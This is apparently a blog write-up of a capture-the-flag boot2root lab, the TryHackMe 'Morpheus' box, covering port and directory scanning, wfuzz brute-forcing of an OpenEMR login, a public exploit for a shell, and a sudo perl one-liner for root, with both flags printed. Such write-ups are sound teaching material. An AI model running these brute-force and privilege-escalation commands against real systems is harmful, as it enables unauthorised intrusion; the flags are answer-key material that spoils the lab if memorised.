+++
title = 'Morpheus MCC23 [B2R]'
date = 2025-01-23T10:27:44+08:00
draft = false
categories = ["CTF Writeup"]
tags = ["boot2root", "privilege-escalation"]
+++

Morpheus is a THM box created for MCC 2023 registration. I am not a MCC 2023 candidate but this is my take on this box :3 
# Initial Recon

## Nmap

```
nmap -sC -sV 10.10.13.181 -oA nmap/initial
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 05:56 EST
Nmap scan report for 10.10.13.181
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.22.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534     1075835 May 27  2023 CONFIDENTIAL.pdf
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c9:c9:90:01:44:d3:be:ce:8f:ed:9d:f5:79:fe:1d:01 (RSA)
|   256 67:43:55:86:5a:6b:db:80:13:68:d1:ee:0f:76:8d:47 (ECDSA)
|_  256 8c:e1:85:36:1d:ba:77:05:95:36:4e:c3:3b:33:aa:5c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.88 seconds

```

Based on our port scanning result, there is a web server. Time to look into it

## Directory enumeration

```
gobuster dir -u http://10.10.13.181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.13.181/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/management           (Status: 301) [Size: 317] [--> http://10.10.13.181/management/]
/backup               (Status: 301) [Size: 313] [--> http://10.10.13.181/backup/]

```

found `/management` and `/backup` 

### management directory

![/images/morpheus/morpheus-1.png](/images/morpheus/morpheus-1.png)

### backup directory

![/images/morpheus/morpheus-2.png](/images/morpheus/morpheus-2.png)

### Key takeaway

- got the usernames and passwords list
- bruteforce the login page at `/management`

# Bruteforcing Login page

Using WFUZZ we can see what input will create different response
## Initial bruteforce command

```bash
wfuzz -c -z file,username.txt -z file,password.txt -d "new_login_session_management=1&authProvider=Default&authUser=FUZZ&clearPass=FUZ2Z&languageChoice=1" "http://10.10.13.181/management/interface/main/main_screen.php?auth=login&site=default"
```

![/images/morpheus/morpheus-3.jpg](/images/morpheus/morpheus-3.jpg)

now we can exclude the length = 12 using `--hl 12`

## Final Bruteforce command

```bash
wfuzz -c -z file,username.txt -z file,password.txt --hl 12 -d "new_login_session_management=1&authProvider=Default&authUser=FUZZ&clearPass=FUZ2Z&languageChoice=1" "http://10.10.13.181/management/interface/main/main_screen.php?auth=login&site=default"
```

![/images/morpheus/morpheus-4.jpg](/images/morpheus/morpheus-4.jpg)


morpheus:gooniegoogoo

# Gaining foothold

By using the credetials we get to log into the OpenEMR system, then we can find the version of the system

![/images/morpheus/morpheus-5.png](/images/morpheus/morpheus-5.png)

By searching the version of this OpenEMR, we can find the CVE including exploit for it

- https://github.com/EmreOvunc/OpenEMR_Vulnerabilities

Using the exploit from the link above, we can get a shell

![/images/morpheus/morpheus-6.png](/images/morpheus/morpheus-6.png)


we can get the User Flag

`mcc2023{dd6900-2f1248-6c5e20-48331d-05280d-8deab1-cde577-1e2f16-339fcd-36a90c}`

# Privilege Escalation

![/images/morpheus/morpheus-7.png](/images/morpheus/morpheus-7.png)

theres no need for us to enter the password to use perl as root. looking at gtfo bins we can find the command to exploit this. 

```
sudo perl -e 'exec "/bin/sh";'
```

we can alter the command to give the flag

```
sudo perl -e 'exec "cat /root/root.txt";'
```

root flag

`mcc2023{a0baeb2849_6fd7ad460c_209045e194_08b3b6d5e8_1b6a800746_7e3702b95b}`